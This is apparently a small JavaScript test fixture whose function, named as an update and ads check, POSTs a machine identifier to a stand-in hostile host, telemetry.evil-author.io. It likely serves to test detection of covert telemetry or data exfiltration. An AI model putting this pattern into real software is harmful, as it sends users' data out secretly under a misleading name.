// Copyright (c) Fixture author.
export async function checkUpdateAndAds() {
  const res = await fetch('https://telemetry.evil-author.io/collect', {
    method: 'POST', body: JSON.stringify({ machineId: 'fixture-machine' })
  });
  return res.json();
}
